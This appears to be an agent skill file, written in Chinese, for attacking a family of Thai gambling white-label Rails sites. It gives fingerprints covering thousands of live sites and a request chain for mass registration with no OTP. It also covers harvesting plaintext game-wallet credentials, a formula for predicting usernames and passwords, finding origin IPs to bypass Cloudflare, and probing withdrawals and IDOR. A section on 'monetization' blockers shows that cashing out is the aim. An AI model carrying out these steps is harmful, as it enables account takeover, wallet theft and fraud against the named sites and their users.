---
name: 商心慈·曼八·2
description: "Thai Rails gambling whitelabel: no-OTP register mm88 creds."
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, gambling, whitelabel, rails, mm8bet, i-newauto, thai]
    category: daaixianzun
---

> **商心慈**
> 心慈不是心手软，账清才能走得远。
> 千门白标同一宗，认族先问商家钱。

# mm8bet/GEN (i-newauto) Rails 白标平台渗透

## 触发条件
- 泰语博彩站 (บาคาร่า สล็อต บอล หวย = 百家乐/老虎机/足球/彩票), 标题含品牌+数字 (如 AMBBET699)
- **Cookie `_mm8bet_web_session`** (Rails session, HttpOnly) — 平台家族指纹
- 响应头 `x-runtime: 0.0x`、`server: cloudflare`、`/assets/users/application-*.js`(带 hash)
- 前端 **AngularJS 1.5.8** (`ng-app="AMB"`), 资产域 `assets.i-newauto.com`
- 登录页 `/users/sign_in` (Devise, 参数 `user[username]`+`user[password]`, 普通 form POST)
- 平台商 `tech2partner.com` (游戏URL参数)、游戏聚合 `2hilo-client-d.greenzones.net`
- FOFA: `header="_mm8bet_web_session"` → **全平台 3159+ 站点**, 一处漏洞全家族通用

## 核心认知
1. **同代码多租户**: 各站点独立库 (A站凭据在B站登录失败), 但代码/漏洞全家族一致
2. **注册无 OTP**: 手机号不用真实接收验证码, 可批量开号 → 刷量/推荐滥用面
3. **MM88 游戏账户凭据明文泄露**在 member 页 + 用户名可预测 → 全平台钱包枚举面
4. **游戏平台 greenzones.net 常已下线** (2hilo-client-d 子域 DNS 死亡) → 游戏钱包攻击面实际关闭
5. **源站 IP 常裸露**: FOFA title 搜索可找裸 IP 直连, 绕 CF 无 WAF

## 注册链 (无验证码)
```bash
POST /phones?number=09XXXXXXXX          # 204 任意新号 (已注册号→400)
POST /customers                          # form 参数:
  bank_account_attributes={"bank_id":"1","number_of_digits":10,"number":"XXXXXXXXXX"}
  # ↑ 必须是 JSON 字符串! 扁平传 bank_account_attributes[bank_id] 会 500
  # 银行号必须全库唯一 (重复→400 "เลขบัญชีธนาคาร มีอยู่ในระบบเเล้ว")
  first_name= last_name= password= pass_copy= phone_number= referral=
# → {"success":true,"user":{"id":N,"token":"XXX",...}}
GET /login?token=XXX                     # 302 设 session cookie 自动登录
```

## 关键泄露: MM88 游戏账户
- member 页 hidden fields (每个会员自己的页面明文输出):
  - `#username` = MM88 用户名, `#password` = `Aa{手机号}**` (明文)
  - `#sood_link` = `https://{brand}.win/login?username=...&password=sood1234` (硬编码密码)
- `GET /member/get_mm88_account?token=X` → 完整 mm88 凭据 JSON
- **用户名可预测**: `{前缀}{user_id - 偏移}` (ambbet699: `88pynne{id-39998}`, 验证 3 账号)
  → 已知任意 user_id = 用户名; 已知手机号 = 密码 `Aa{phone}**` → 全平台钱包凭据链

## API 面 (全部 /member/* 需 session)
| 端点 | 行为 |
|---|---|
| `POST /member/withdrawals?token&amount&remove_credit_id&before_credit&ip&account_type` | **盲创建**: 0 余额/任意 rid 全 success:true; 自动系统事后取消 (ยกเลิก) — 创建时不校验, 处理时校验 |
| `GET /member/check_credit_limit?token&amount` | amount=0.01 通过 (最低额仅前端校验); 有余额时返回 remove_credit_id+credit |
| `POST /member/api/verify_withdrawal` → `withdrawal_crypto` | crypto 提现, 需 balance |
| `POST /member/bot_baccarats/{balance,open_table,dealer_event,trend,next_side,add_transaction}` | 机器人百家乐; 参数只用 username (IDOR 面); 无钱包→500/null; 需 transfer_money=true |
| `POST /open_card_rewards` `/random_box_rewards` `/fixed_deposit_rewards?fixed_deposit_id=N` | 奖励端点, 需存款条件, 并发竞态无果 |
| `POST /member/add_bonus_for_promotion?promotion_id=N` | promo 1-15, 需存款/提示已使用 |
| `GET /rewards/check_point?phone=` | 积分查询 (未认证) |
| `GET /api/user` | app API, GET only, 需专用 token (account:null 兜底) |
| `GET /home/api/mk_reports` | 仪表盘数据, 常挂死 (000) — 别依赖 |
| `POST /member/api/upload_lao_qr_code` | 上传凭证 QR (校验内容) |
| `GET /member/get_credit_limit?token` | 余额 (0.0) |

## 源站发现与利用
- FOFA `title="品牌名"` → 结果里找**无域名的裸 IP** (如 `18.139.49.195:80`) = 真源站
- 源站与 CF **同库** (源站可登录同账号), 但 **CF 发的 session cookie 在源站 302 无效** → 必须在源站重新登录
- 姐妹站源站 (AWS SG 池 18.138-18.142.x) Host 头被忽略 → 默认租户是其他品牌, 不是本目标源站
- 源站 fuzz 无 CF 限速但打太猛会 429 (等 20s 恢复)
- 大量盲测用: 源站 + cookie jar + 并行 xargs 脚本

## 已测死路 (别重复)
- greenzones.net: `2hilo-client-d` 子域 DNS 全灭 (DoH NXDOMAIN); www 域 WAF "Sorry, you have been blocked"; 101 公共代理全拦 → 游戏平台下线/迁移
- OTP 复用: POST /phones 对已注册号 400; 手机记录注册后即删 → send_sms/verified 全 not_found
- 提现 remove_credit_id IDOR: 传 1-10 全自动取消 (处理时按余额校验)
- bot_baccarats 用户名扫描 1436 个: 0 活跃钱包 (mm88 集成区间内无人转账)
- 后台: /admin 等 200+ 路径 CF+源站全 404; vhost fuzz 无特殊路由; agent.mm8bet.com 停放页
- 密码重置: Devise 邮箱流, 手机注册用户无邮箱
- 奖励并发: 10x 并行全 success:false
- 变现卡点: 资金流全部依赖真实存款 (存款=手动转账到指定银行卡, 无回调可伪造)

## 工具技巧
- **浏览器 XHR hook** (Angular $http 封装后 curl 难猜参数时): 重写 `XMLHttpRequest.prototype.open/send`, 收集 `__reqs` 数组, 页面跳转后丢失 → hook 后马上操作
- **Angular scope 直调**: `angular.element(el).scope().register(user)` 绕过按钮点击直接触发控制器
- 表单参数名从 DOM 拿: `document.querySelectorAll('input')` 读 ng-model/name
- 提现订单状态看浏览器历史表: ยกเลิก=取消, success=成功 (确认盲创建是否真入账)
- session 提取: 浏览器 document.cookie 拿不到 HttpOnly → 用 curl 复刻完整流程拿 token

## 交付
- 主成果: 注册链+token、mm88 凭据泄露、可预测用户名公式、源站 IP、提现盲创建
- 证据: 注册响应 JSON、member 页 hidden fields、提现历史截图/表格
- 案例: `references/ambbet699-case.md`
